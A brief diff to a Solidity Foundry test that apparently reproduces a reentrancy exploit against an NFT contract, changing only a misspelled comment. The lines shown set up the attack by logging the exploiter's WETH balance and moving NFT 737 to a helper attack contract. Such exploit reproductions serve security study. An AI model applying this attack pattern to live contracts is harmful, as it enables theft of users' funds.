@@ -77,7 +77,7 @@ contract ContractTest is Test {
             "Exploiter WETH balance before attack", WETH.balanceOf(address(this)), WETH.decimals()
         );
 
-        // Transfering NBF NFT token (id = 737) from main attack contract to helper attack contract which will be exploiting reentrancy vulnerability
+        // Transferring NBF NFT token (id = 737) from main attack contract to helper attack contract which will be exploiting reentrancy vulnerability
         vm.prank(mainAttackContract, exploiterEOA);
         NBF.transferFrom(mainAttackContract, address(this), 737);
         assertEq(NBF.ownerOf(737), address(this));
